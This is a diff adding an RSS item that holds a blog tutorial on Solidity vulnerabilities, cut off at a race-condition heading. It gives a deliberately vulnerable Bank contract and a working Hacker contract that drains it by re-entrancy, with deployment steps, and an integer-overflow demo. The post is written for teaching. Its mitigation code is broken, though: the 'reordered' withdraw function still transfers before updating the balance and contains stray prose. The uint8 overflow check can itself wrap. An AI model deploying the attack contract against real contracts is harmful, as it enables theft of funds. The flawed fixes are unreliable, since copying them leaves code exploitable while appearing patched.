@@ -50,6 +50,222 @@ ERC 1363: Payable Token​ Regarding ERC20 tokens, we generally use them for pay
     </item>
     
     <item>
+      <title>Solidity Vulnerabilities</title>
+      <link>https://somesh-banerjee.github.io/blogs/posts/solidity-vulnerabilities/</link>
+      <pubDate>Wed, 08 Jun 2022 23:35:09 +0530</pubDate>
+      
+      <guid>https://somesh-banerjee.github.io/blogs/posts/solidity-vulnerabilities/</guid>
+      <description>Introduction Smart contracts built on blockchain platforms like Ethereum have transformed various industries by enabling decentralized and trustless applications. Smart contracts are written in solidity language and deployed in the EVM blockchain, which enable self-executing agreements without the need for intermediaries, revolutionizing industries such as finance, governance, and others.
+However, we know blockchain is immutable and so are smart contracts; Once they are deployed, it cannot be changed. This means that any security flaw or vulnerability within the code remains permanently exploitable.</description>
+      <content>&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;Smart contracts built on blockchain platforms like Ethereum have transformed various industries by enabling decentralized and trustless applications. Smart contracts are written in solidity language and deployed in the EVM blockchain, which enable self-executing agreements without the need for intermediaries, revolutionizing industries such as finance, governance, and others.&lt;/p&gt;
+&lt;p&gt;However, we know blockchain is immutable and so are smart contracts; Once they are deployed, it cannot be changed. This means that any security flaw or vulnerability within the code remains permanently exploitable.&lt;/p&gt;
+&lt;p&gt;In this article, I will go through some of the common solidity vulnerabilities in detail. We will try to recreate the  vulnerabilities in the contract to understand it and also discuss how to mitigate these pitfalls.&lt;/p&gt;
+&lt;h1 id=&#34;re-entrancy-attack&#34;&gt;Re-entrancy attack&lt;/h1&gt;
+&lt;p&gt;Re-entrancy attack is a type of attack where the malicious contract re-enters the target contract by calling the target contract&amp;rsquo;s function before the completion of its current execution.&lt;/p&gt;
+&lt;p&gt;To understabd how it is happening, let&amp;rsquo;s understand it by considering contracts as persons. Imagine Person B who acts as a bank and maintain a registry for tracking the balance of other people. Now a malicious Person H deposits 100 money to B. B updates H&amp;rsquo;s balance in the registry to 100. Other persons have also deposited to B and the total value depositted is 1200.&lt;/p&gt;
+&lt;p&gt;Whenever anybody withdraw money from B, he first gives the money and then update it in the registry. Now imagine H withdraws his money i.e. 100, and before it gets updated he agains withdraw it. Since the registry is not updated he agains get 100. H continues withdrawing until B has 0 balance.&lt;/p&gt;
+&lt;p&gt;This sounds absurd in real life, that a person withdraws but he can withdraw again before the registry gets updated, but in smart contract, this is possible using &lt;code&gt;fallback&lt;/code&gt; functions. There is a function called &lt;code&gt;receive()&lt;/code&gt; which gets called everytime some ether is transferred to a contract.&lt;/p&gt;
+&lt;p&gt;Let create a vulnerable contract Bank and try to recreate the attack.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;pragma solidity &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+
+contract Bank &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+    mapping &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; uint256&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; userBalance&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+   
+   &lt;span style=&#34;color:#75715e&#34;&gt;// returns the balance of the user passed as parameter
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    function &lt;span style=&#34;color:#a6e22e&#34;&gt;getBalance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;address u&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; view &lt;span style=&#34;color:#a6e22e&#34;&gt;returns&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;uint256&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; userBalance&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;u&lt;span style=&#34;color:#f92672&#34;&gt;];&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;// returns the balance of the contract
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    function &lt;span style=&#34;color:#a6e22e&#34;&gt;getBalance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; view &lt;span style=&#34;color:#a6e22e&#34;&gt;returns&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;uint256&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; address&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;balance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;// deposit the amount passed with the call to the balance of the user
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    function &lt;span style=&#34;color:#a6e22e&#34;&gt;addToBalance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; payable&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+        userBalance&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;   
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;// withdraw the whole balance of the user
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    function &lt;span style=&#34;color:#a6e22e&#34;&gt;withdrawBalance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; payable  &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+        &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;bool sent&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;call&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;value&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; userBalance&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]}(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+        userBalance&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;   
+&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we will create the Attacker contract, that will drain the Bank contract using the &lt;code&gt;receive&lt;/code&gt; fallback function&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// SPDX-License-Identifier: MIT
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;pragma solidity &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+
+contract Hacker &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+    Bank bank&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+
+    constructor&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;address _a&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+        bank &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Bank&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;_a&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+    
+    &lt;span style=&#34;color:#75715e&#34;&gt;// returns the balance of the contract
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    function &lt;span style=&#34;color:#a6e22e&#34;&gt;getBalance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; view &lt;span style=&#34;color:#a6e22e&#34;&gt;returns&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;uint256&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; address&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;balance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;// attack the bank contract
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    function &lt;span style=&#34;color:#a6e22e&#34;&gt;attack&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; payable &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+        require&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; 1 ether&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt; 
+        bank&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;addToBalance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;value&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}();&lt;/span&gt;
+        bank&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;withdrawBalance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;// fallback function which is called when the bank contract sends the ether
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    receive&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; external payable &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;bank&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getBalance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
+            bank&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;withdrawBalance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
+        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To understand the flow, first deploy the &lt;code&gt;Bank&lt;/code&gt; contract in the testnet and deposit 1 or more ether from multiple accounts/wallets. Now deploy the &lt;code&gt;Hacker&lt;/code&gt; contract. Pass the &lt;code&gt;Bank&lt;/code&gt; contract&amp;rsquo;s address while deploying. Call the &lt;code&gt;attack()&lt;/code&gt; function of the &lt;code&gt;Hacker&lt;/code&gt; contract with 1 ether value. After the call, you will notice that the balance of &lt;code&gt;Bank&lt;/code&gt; contract will be 0 and all the ether which was in &lt;code&gt;Bank&lt;/code&gt; is transferred to &lt;code&gt;Hacker&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;What is happening here is, when we call the &lt;code&gt;attack()&lt;/code&gt; function, the &lt;code&gt;Hacker&lt;/code&gt; contract first deposits 1 ether in the &lt;code&gt; Bank&lt;/code&gt; contract. After that &lt;code&gt;Hacker&lt;/code&gt; calls the &lt;code&gt;Bank.withdrawBalance()&lt;/code&gt; function. By calling the &lt;code&gt;withdrawBalance()&lt;/code&gt; function, the &lt;code&gt;Bank&lt;/code&gt; transfers the userBalnce of &lt;code&gt;Hacker&lt;/code&gt; i.e. 1 ether to &lt;code&gt;Hacker&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Now in &lt;code&gt;Hacker&lt;/code&gt; we have defined the fallback function &lt;code&gt;receive()&lt;/code&gt; which is called when the 1 ether is transferred to the contract. In the &lt;code&gt;receive()&lt;/code&gt; function, we are again calling the &lt;code&gt;withdrawBalance()&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Now understand the &lt;code&gt;withdrawBalance()&lt;/code&gt; function flow in this case from the following snippet&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;withdrawBalance&lt;/span&gt;() &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;payable&lt;/span&gt;  {
+    (&lt;span style=&#34;color:#a6e22e&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sent&lt;/span&gt;, ) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;call&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userBalance&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;]}(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;);
+    &lt;span style=&#34;color:#75715e&#34;&gt;// . --&amp;gt; receive() is called at his point after transferring and before updating the userBalance
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;userBalance&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+}  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the above snippet you can understand, that wen the &lt;code&gt;receive()&lt;/code&gt; is being called the &lt;code&gt;userBalace&lt;/code&gt; mapping is not yet updated. Hence again 1 ether will be transferred. This transfer will again triger the &lt;code&gt;receive()&lt;/code&gt; and the process will go on recursively till it totally drains the &lt;code&gt;Bank&lt;/code&gt; contract.&lt;/p&gt;
+&lt;h4 id=&#34;how-to-mitigate&#34;&gt;How to mitigate&lt;/h4&gt;
+&lt;p&gt;To mitigate the reentrancy attack in the above scenario, we can just change the order of execution as follw:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;withdrawBalance&lt;/span&gt;() &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;payable&lt;/span&gt;  {
+    (&lt;span style=&#34;color:#a6e22e&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sent&lt;/span&gt;, ) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;call&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userBalance&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;]}(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;);&lt;span style=&#34;color:#a6e22e&#34;&gt;transferring&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;before&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;updating&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userBalance&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;userBalance&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+} 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now if the Hacker recursively calls the &lt;code&gt;withdrawBalance()&lt;/code&gt; function, no ether will be transferred as the mapping is updated. So to avoid reentrancy first update the state variables and then interact with external contracts/wallets.&lt;/p&gt;
+&lt;p&gt;Another way to prevent reentrancy is by using reentrancy guard. You can use state variables and modifier to design a guard, that will lock the function untill the execution is complete. For example:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;modifier&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;nonReentrant&lt;/span&gt;() {
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;locked&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Reentrant call detected&amp;#34;&lt;/span&gt;);
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;locked&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;locked&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Also you can use &lt;a href=&#34;https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard&#34;&gt;Openzeppelin ReentrancyGuard&lt;/a&gt; instead of creating your own modifier.&lt;/p&gt;
+&lt;h1 id=&#34;integer-overflow&#34;&gt;Integer Overflow&lt;/h1&gt;
+&lt;p&gt;Overflow occurs when we exceed the limit of any variable. For example &lt;code&gt;uint8&lt;/code&gt; can store value between 0 to 255, and if we try to store 256, it will store it as 0. We can try this by writing the following contract:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;pragma solidity &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+
+contract Overflow &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+    uint8 &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; val &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+    
+    function &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;uint8 value&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; external &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+        val &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; value&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// possible overflow
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; 
+&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Try adding 255 and check the value. It will show 255. Now if you add 1, &lt;code&gt;val&lt;/code&gt; will become 0.&lt;/p&gt;
+&lt;h4 id=&#34;how-to-mitigate-1&#34;&gt;How to mitigate&lt;/h4&gt;
+&lt;p&gt;The best way to avoid overflow is to upgrade solidity version to 0.8.0 or later, to get built-in protection against overflow and underflow.&lt;/p&gt;
+&lt;p&gt;Moreover you can perform check before performing a calculation like:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;pragma solidity &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+
+contract Overflow &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+    uint8 &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; val &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+    
+    function &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;uint8 value&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; external &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+        require&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;val &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; value &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; 255&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Overflow&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+        val &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; value&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; 
+&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;race-condition&#34;&gt;Race Condition&lt;/h1&gt;
